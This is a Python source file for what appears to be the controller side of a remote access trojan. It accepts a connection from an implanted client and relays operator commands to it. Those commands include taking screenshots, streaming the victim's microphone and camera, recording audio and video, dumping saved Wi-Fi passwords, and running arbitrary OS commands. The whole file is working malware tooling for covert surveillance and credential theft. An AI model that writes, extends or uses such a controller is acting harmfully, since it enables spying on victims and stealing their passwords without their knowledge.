import socket
import shlex
import json

HOST = '127.0.0.1'
PORT = 65432
VALID_COMMANDS = (
    "help", "sudo", "screanshort", "stream_mic", "stream_camera",
    "capture_video", "capture_audio", "get_wifi_passwords",
    "get_wifi_profiles", "get_wifi_password_all"
)

def start_server():
    """
    Starts the server to listen for client connections.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[*] Server listening on {HOST}:{PORT}")
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")
        return client_socket, client_address

def handle_command(command):
    """
    Processes the input command and determines its type.
    """
    command_parts = shlex.split(command)
    if not command_parts:
        return None, None

    command_type = command_parts[0].lower()
    return command_type, command_parts[1:]

def handle_client(client_socket):
    """
    Manages client communication and command execution.
    """
    try:
        while True:
            command = input("Enter a command > ").strip()
            if not command:
                continue

            command_type, command_args = handle_command(command)

            if command_type in ("exit", "quit"):
                confirm = input("Terminate connection (yes/no)? ").strip().lower()
                if confirm == "yes":
                    client_socket.sendall(b"exit")
                    print("[*] Connection terminated.")
                    break

            elif command_type in VALID_COMMANDS:
                client_socket.sendall(command.encode())
                response = client_socket.recv(4096).decode()
                print(f"Response:\n{response}\n")

            else:
                print("Use 'help' to list valid commands with discriptions.")
                print(f'''Invalid command: '{command}'. Try with 'sudo' infront of the command to execute is as an OS command.''')
    finally:
        client_socket.close()

def main():
    """
    Entry point for the server application.
    """
    client_socket, _ = start_server()
    handle_client(client_socket)

if __name__ == "__main__":
    main()
